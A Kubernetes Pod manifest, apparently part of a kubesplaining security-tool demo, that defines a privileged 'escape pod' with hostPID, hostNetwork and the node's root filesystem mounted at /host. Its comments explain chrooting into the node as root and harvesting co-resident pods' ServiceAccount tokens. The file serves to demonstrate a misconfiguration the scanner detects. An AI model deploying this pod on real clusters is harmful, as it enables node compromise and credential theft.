# The privileged escape pod the attacker creates during the PoC.
# Applied by scripts/eks-demo/poc.sh step 3 under the holy-splain-attacker
# kubeconfig context. The dev-team namespace does not enforce restricted Pod
# Security Admission, which is exactly the precondition kubesplaining flags
# via KUBE-PRIVESC-002 / KUBE-PRIVESC-PATH-NODE-ESCAPE.
#
# What this gives the attacker:
#   - hostPID/hostNetwork: visibility into the node's process tree and network
#   - privileged: bypasses container isolation entirely
#   - hostPath / mounted at /host: arbitrary read/write on the node's filesystem
#
# With /host mounted, the attacker can `chroot /host` to become root on the
# EC2 instance and read /var/lib/kubelet/pods/.../token to harvest co-resident
# pods' projected ServiceAccount tokens (PoC step 5).
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: dev-team
  labels:
    kubesplaining.demo: holy-splain
    role: attacker
spec:
  restartPolicy: Never
  hostPID: true
  hostNetwork: true
  containers:
    - name: shell
      image: public.ecr.aws/aws-cli/aws-cli:latest
      command: ["/bin/sh", "-c", "sleep 3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-root
          mountPath: /host
      resources:
        requests:
          cpu: 10m
          memory: 32Mi
  volumes:
    - name: host-root
      hostPath:
        path: /
        type: Directory
